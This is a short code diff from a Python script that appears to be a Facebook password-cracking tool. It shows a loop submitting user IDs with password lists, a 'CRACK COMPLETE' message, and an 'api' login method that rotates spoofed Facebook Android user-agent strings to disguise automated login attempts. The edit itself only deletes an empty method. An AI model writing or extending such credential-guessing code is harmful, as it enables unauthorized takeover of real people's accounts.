@@ -173,10 +173,7 @@ class Main:
 					coeg.submit(self.api, user, listpass.split(","))
 			exit("\n\n    [#] CRACK COMPLETE...")
 		except Exception as e:exit(str(e))
-	def v2(self):
-		
-
-
+	
 	def api(self, uid, pwx):
 		ua = random.choice([
 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
